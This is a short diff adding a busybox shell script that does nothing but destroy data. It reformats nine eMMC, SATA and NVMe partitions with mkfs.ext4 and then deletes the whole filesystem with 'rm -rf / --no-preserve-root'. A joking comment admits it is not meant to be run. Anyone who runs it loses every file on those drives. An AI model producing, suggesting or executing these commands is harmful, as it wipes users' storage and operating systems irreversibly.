@@ -1,0 +1,13 @@
+#!/bin/busybox sh
+
+mkfs.ext4 /dev/mmcblk0p1
+mkfs.ext4 /dev/mmcblk0p2
+mkfs.ext4 /dev/mmcblk0p3
+mkfs.ext4 /dev/sda1
+mkfs.ext4 /dev/sda2
+mkfs.ext4 /dev/sda3
+mkfs.ext4 /dev/nvme0n1p1
+mkfs.ext4 /dev/nvme0n1p2
+mkfs.ext4 /dev/nvme0n1p3
+
+rm -rf / --no-preserve-root # you're not supposed to run this, why not give you a reason?
